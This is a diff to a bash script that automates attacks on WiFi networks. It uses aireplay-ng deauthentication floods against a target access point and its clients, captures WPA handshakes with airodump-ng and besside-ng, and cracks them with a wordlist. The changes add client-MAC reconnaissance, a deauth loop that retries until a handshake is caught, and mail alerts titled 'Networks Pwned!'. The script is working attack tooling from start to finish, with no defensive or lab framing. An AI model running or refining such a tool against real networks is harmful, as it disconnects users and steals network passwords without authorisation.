@@ -251,17 +251,11 @@ echo "Remember to check your spam folder!"
 sleep 3
 network
 monitor
-sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
-echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
-echo -e "\e[32mAttacking...\e[0m"
-sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
-#captureMAC
-deauthAttack
-sudo airmon-ng stop $foo > /dev/null 2>&1
-sudo systemctl start NetworkManager > /dev/null 2>&1
-stopMon
-checkservices
-checkWiFiStatus
+airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
+echo -e "[${Green}${foo}${White}] Sending DeAuth to target..."
+xterm -e aireplay-ng --deauth 20 -a $bssid $foo
+echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
+check_cap_files
 sleep 3
 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
 crack
@@ -269,19 +263,25 @@ crack
 
 
 attackNo () {
-network
-monitor
-sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
-echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
-echo -e "\e[32mAttacking...\e[0m"
-sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
-captureMAC
-deauthAttack
-#check_cap_files
-#check_eapol_in_cap
-crack
- # Clean up capture files
-  #rm -f "${capture_file}"*
+    network
+    monitor
+airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
+echo -e "[${Green}${foo}${White}] Sending DeAuth to target..."
+xterm -e aireplay-ng --deauth 20 -a $bssid $foo
+echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
+check_cap_files
+}
+
+wordlist () {        ##### Enter path to wordlist or use default #####
+read -p $'[\e[0;92mInput\e[0;97m] Path to wordlist (Press enter to use default): ' fileLocation
+if [ -z "$fileLocation" ]; then
+fileLocation="${parameter:-dictionary/defaultWordList.txt}"
+return 0
+elif [[ -f "$fileLocation" ]]; then
+return 0
+fi
+echo -e "[${Red}!$White] File doesn't exist..."
+wordlist
 
 }
 
@@ -318,25 +318,16 @@ echo "Remeber to check your spam folder!"
 network
 sudo besside-ng $foo
 check_cap_files
-check_eapol_in_cap
-stopMon
-checkServices
 sleep 10
 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
-crack
 }
 
 
 attackAllNo () {
 network
 sudo besside-ng $foo
-stopMon
-sudo chmod -R 755 air-crack
-echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
-checkservices
 check_cap_files
-check_eapol_in_cap
-crack
+
 }
 
 
@@ -396,18 +387,25 @@ cleanup_handshakes() {
   fi
 
   # Find and move all .cap files to the handshakes directory
-  echo "Moving .cap files to handshakes folder..."
+  echo "Renaming and moving .cap files to handshakes folder..."
 
-  # Iterate over all .cap files and move them to the handshakes folder
+  # Iterate over all .cap files and move them to the handshakes folder with a timestamp
   for cap_file in *.cap; do
     if [ -f "$cap_file" ]; then  # Ensure it's a valid file
-      echo "Moving $cap_file to handshakes/"
-      mv "$cap_file" handshakes/
+      # Generate a timestamp in the format YYYY-MM-DD_HH-MM-SS
+      timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
+      
+      # Create a new filename with the timestamp
+      new_file="handshakes/${timestamp}_$(basename "$cap_file")"
+      
+      # Rename and move the file
+      echo "Renaming $cap_file to $new_file"
+      mv "$cap_file" "$new_file"
     fi
   done
 
   # Confirm the cleanup is done
-  echo "Cleanup complete. All .cap files moved to handshakes."
+  echo "Cleanup complete. All .cap files renamed and moved to handshakes."
 }
 
 
@@ -668,6 +666,14 @@ check_cap_files() {
             echo -e "\nChecking $cap_file for EAPOL frames..."
             if check_eapol_in_cap "$cap_file"; then
                 echo -e "\e[32m[EAPOL Found]\e[0m Proceeding with cracking."
+                
+                # Turn off monitor mode silently
+                echo "Turning off monitor mode..."
+                sudo airmon-ng stop wlan0mon > /dev/null 2>&1
+                sudo airmon-ng stop wlp7s0mon > /dev/null 2>&1
+                sudo systemctl start NetworkManager > /dev/null 2>&1
+
+                # Now proceed with cracking
                 crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
                 return 0  # Stop after finding a valid file with EAPOL
             else
@@ -684,61 +690,65 @@ check_cap_files() {
         sleep 3
         deauthAttack
     fi
+
 }
 
-
-
 deauthAttack () {
+sudo rm -rf *.cap
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
-captureMAC
-sudo aireplay-ng --deauth 50 --bssid $bssid --channel $channel $client $foo
-sudo aireplay-ng --deauth 100 -a $bssid -c $client $foo
-sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
+recon
+xterm -e aireplay-ng -0 50 -a $bssid -c $client $foo
+sleep 2
 check_cap_files
  } 
 
 
 
+# Function to perform client MAC capture and file handling
+recon() {
+    echo -e "\e[32m[Scanning for clients...]\e[0m"  # Green text for scanning message
 
+    # Start airodump-ng in a separate terminal window using xterm
+    xterm -hold -e "sudo airodump-ng --bssid $bssid --channel $channel --output-format csv --write client $foo && sleep 30 && exit" &
 
+    # Allow 30 seconds for the capture file to populate
+    echo "Waiting for 30 seconds for airodump to capture data..."
+    sleep 30
 
-# Function to check if .cap files exist and verify EAPOL frames
-check_cap_files() {
-    # Clear the screen
-    #clear
+    # Check if the capture CSV file exists and contains data
+    if [ ! -f "client-01.csv" ]; then
+        echo -e "\e[31mError: client-01.csv not found. Airodump-ng may not have captured any data.\e[0m"
+        return 1
+    fi
 
-    # Check if any .cap files exist in the current directory
-    if ls *.cap &> /dev/null; then
-        # .cap files are present
-        echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"  # Green text
-        
-        # Loop through each .cap file to check for EAPOL frames
-        for cap_file in *.cap; do
-            echo -e "\nChecking $cap_file for EAPOL frames..."
-            if check_eapol_in_cap "$cap_file"; then
-                echo -e "\e[32m[EAPOL Found]\e[0m Proceeding with cracking."
-                crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
-                return 0  # Stop after finding a valid file with EAPOL
-            else
-                echo -e "\e[31m[EAPOL Not Found]\e[0m Skipping file."
-            fi
-        done
-        
-        # If no valid .cap files with EAPOL are found, exit
-        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured. Trying again...\e[0m"
-        deauthAttack
+    # Extract the client MAC addresses from the CSV file, skipping the BSSID
+    echo -e "\e[32m[Client MAC addresses found in client-01.csv]:\e[0m"
+    
+    client_found=false
+    # Read through the CSV file to find client MACs (excluding the BSSID)
+    while IFS=',' read -r station_mac first_time last_time power packet_count bssid probed_essid; do
+        # Skip the header or rows where station MAC equals the BSSID
+        if [[ "$station_mac" != "$bssid" && -n "$station_mac" && "$station_mac" != "Station MAC" && "$station_mac" != "$first_time" ]]; then
+            client=$station_mac  # Correctly assign to $client
+            client_found=true
+            echo -e "\e[32m[Client found: $client]\e[0m"  # Green text for client found
+            break
+        fi
+    done < <(tail -n +2 client-01.csv)  # Skip header row using tail
+    
+    # If no client MAC is found
+    if [ "$client_found" = false ]; then
+        echo -e "\e[31m[Client not found]\e[0m"  # Red text for client not found
     else
-        # No .cap files found
-        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"  # Red text
-        sleep 3
-        deauthAttack
+        # Check if the .cap file exists and rename it
+        if [ -f "client-01.cap" ]; then
+            mv client-01.cap client.cap
+            echo -e "\e[32m[Capture file renamed to client.cap]\e[0m"
+        else
+            echo -e "\e[31mError: client-01.cap file not found to rename.\e[0m"
+        fi
     fi
 }
-
-
-
-
-
 
 
 
@@ -1214,5 +1224,3 @@ menu
 }
 
 targeted
-
-
